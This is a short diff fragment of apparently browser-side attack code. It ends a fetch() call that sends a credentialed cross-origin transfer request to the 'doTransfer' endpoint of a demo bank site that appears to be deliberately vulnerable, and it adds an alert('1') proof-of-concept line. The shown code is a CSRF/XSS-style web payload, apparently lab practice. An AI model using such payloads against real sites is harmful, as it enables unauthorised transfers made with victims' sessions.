@@ -20,3 +20,5 @@ fetch("https://demo.testfire.net/bank/doTransfer", {
   "mode": "cors",
   "credentials": "include"
 });
+
+alert("1")
